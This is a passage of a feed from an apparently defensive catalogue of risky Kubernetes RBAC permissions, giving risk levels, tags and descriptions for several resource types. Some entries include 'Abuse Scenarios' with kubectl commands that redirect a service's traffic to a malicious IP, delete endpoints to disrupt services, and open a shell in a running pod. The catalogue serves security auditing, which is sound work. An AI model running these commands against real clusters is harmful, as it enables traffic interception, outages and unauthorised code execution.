 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>deployments&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, or delete Deployments within a specific namespace. This can be used to deploy pods with privileged settings within that namespace, potentially leading to privilege escalation, persistence, and tampering with applications.&lt;/p></description></item><item><title>Manage Endpoints or EndpointSlices cluster-wide</title><link>https://rbac-atlas.github.io/rules/1073/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1073/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1073&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Endpoints or EndpointSlices cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core, discovery.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>endpoints, endpointslices&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, get, list&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-maninthemiddle">&lt;a href="https://rbac-atlas.github.io/tags/maninthemiddle/">ManInTheMiddle&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-trafficredirection">&lt;a href="https://rbac-atlas.github.io/tags/trafficredirection/">TrafficRedirection&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting Endpoints/EndpointSlices for services across all namespaces. This can be used to redirect traffic intended for legitimate services to malicious pods (Man-in-the-Middle), cause denial of service, or bypass network policies.&lt;/p></description></item><item><title>Manage Endpoints or EndpointSlices in a namespace</title><link>https://rbac-atlas.github.io/rules/1074/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1074/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1074&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Endpoints or EndpointSlices in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core, discovery.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>endpoints, endpointslices&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, get, list&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-trafficredirection">&lt;a href="https://rbac-atlas.github.io/tags/trafficredirection/">TrafficRedirection&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting Endpoints/EndpointSlices for services within a specific namespace. This can lead to traffic redirection, denial of service, or network policy bypass for applications within that namespace.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new Endpoint to redirect traffic for a service in the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: Endpoints
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: &amp;lt;service-name&amp;gt; # Must match an existing service name
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">subsets:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - addresses:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - ip: &amp;lt;malicious-ip-address&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ports:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - port: &amp;lt;service-port&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF (redirect &amp;#39;my-app-service&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing Endpoint within the namespace, causing service disruption.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete endpoint &amp;lt;endpoint-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete endpoint my-frontend-service -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ephemeral containers cluster-wide</title><link>https://rbac-atlas.github.io/rules/1020/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1020/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1020&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ephemeral containers cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/ephemeralcontainers&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-elevationofprivilege">&lt;a href="https://rbac-atlas.github.io/tags/elevationofprivilege/">ElevationOfPrivilege&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits adding or modifying ephemeral containers in any pod across the cluster. This is highly risky as it allows injecting arbitrary code into running pods, facilitating code execution, lateral movement, tampering with live applications, and privilege escalation.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Add an ephemeral debug container to a running pod to gain shell access.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl debug -it &amp;lt;pod-name&amp;gt; -n &amp;lt;namespace&amp;gt; --image&lt;span class="o">=&lt;/span>busybox --target&lt;span class="o">=&lt;/span>&amp;lt;container-name&amp;gt; -- sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl debug -it my-app-pod -n default --image=nicolaka/netshoot --target=my-app-container -- sh&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ephemeral containers in a namespace</title><link>https://rbac-atlas.github.io/rules/1021/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1021/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1021&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ephemeral containers in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/ephemeralcontainers&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>update, patch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-lateralmovement">&lt;a href="https://rbac-atlas.github.io/tags/lateralmovement/">LateralMovement&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadexecution">&lt;a href="https://rbac-atlas.github.io/tags/workloadexecution/">WorkloadExecution&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows adding or modifying ephemeral containers in pods within a specific namespace. This enables injecting code into running pods in that namespace, potentially leading to code execution, lateral movement, tampering, and privilege escalation if sensitive pods are targeted.&lt;/p></description></item><item><title>Manage ETCDSnapshotFiles (k3s.cattle.io)</title><link>https://rbac-atlas.github.io/rules/1065/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1065/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1065&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ETCDSnapshotFiles (k3s.cattle.io)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>k3s.cattle.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>etcdsnapshotfiles&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, create, update, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-backupaccess">&lt;a href="https://rbac-atlas.github.io/tags/backupaccess/">BackupAccess&lt;/a>&lt;/span>
 &lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-credentialaccess">&lt;a href="https://rbac-atlas.github.io/tags/credentialaccess/">CredentialAccess&lt;/a>&lt;/span>
 &lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants access to manage ETCD snapshot files, typically in a K3s environment. ETCD snapshots contain the entire state of the Kubernetes cluster, including all secrets, configurations, and resource definitions. Access allows complete data exposure, credential harvesting, and potentially restoring a compromised state or tampering with backups.&lt;/p></description></item><item><title>Manage FlowSchemas (API Server DoS/Manipulation)</title><link>https://rbac-atlas.github.io/rules/1098/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1098/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1098&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage FlowSchemas (API Server DoS/Manipulation)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>flowcontrol.apiserver.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>flowschemas&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-apiserverdos">&lt;a href="https://rbac-atlas.github.io/tags/apiserverdos/">APIServerDoS&lt;/a>&lt;/span>
 &lt;span class="tag-controlplanedisruption">&lt;a href="https://rbac-atlas.github.io/tags/controlplanedisruption/">ControlPlaneDisruption&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows managing FlowSchema objects cluster-wide. FlowSchemas are part of API Priority and Fairness, controlling how API requests are categorized and prioritized. Misconfiguration can lead to denial of service against the API server for critical components or allow certain requests to bypass throttling, potentially overwhelming the server.&lt;/p></description></item><item><title>Manage IngressClasses (Cluster-wide Traffic Control Tampering)</title><link>https://rbac-atlas.github.io/rules/1092/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1092/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1092&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage IngressClasses (Cluster-wide Traffic Control Tampering)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>networking.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>ingressclasses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-serviceexposure">&lt;a href="https://rbac-atlas.github.io/tags/serviceexposure/">ServiceExposure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting IngressClasses cluster-wide. IngressClasses define types of ingress controllers. Modifying them can affect how all ingresses in the cluster behave, potentially redirecting traffic globally, disabling ingress controllers, or leading to widespread service exposure or denial of service.&lt;/p></description></item><item><title>Manage Ingresses (Namespace Service Exposure/Traffic Redirection)</title><link>https://rbac-atlas.github.io/rules/1091/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1091/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1091&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Ingresses (Namespace Service Exposure/Traffic Redirection)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>networking.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>ingresses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-serviceexposure">&lt;a href="https://rbac-atlas.github.io/tags/serviceexposure/">ServiceExposure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting Ingress objects within a namespace. This can be used to expose internal services to external traffic, redirect legitimate traffic to malicious endpoints, or cause denial of service by misconfiguring routing rules.&lt;/p></description></item><item><title>Manage Jobs cluster-wide (one-off privileged execution)</title><link>https://rbac-atlas.github.io/rules/1041/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1041/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1041&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Jobs cluster-wide (one-off privileged execution)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>batch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>jobs&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting Jobs across all namespaces. Jobs create one or more pods for batch tasks. This can be used to run a one-off pod with privileged settings, leading to code execution, privilege escalation, and tampering.&lt;/p></description></item><item><title>Manage Jobs in a namespace (one-off privileged execution)</title><link>https://rbac-atlas.github.io/rules/1042/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1042/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1042&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Jobs in a namespace (one-off privileged execution)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>batch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>jobs&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting Jobs within a specific namespace. This can be used to run a one-off pod, potentially with privileged settings, leading to code execution and potential privilege escalation within that namespace.&lt;/p></description></item><item><title>Manage Leases cluster-wide</title><link>https://rbac-atlas.github.io/rules/1080/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1080/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1080&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Leases cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
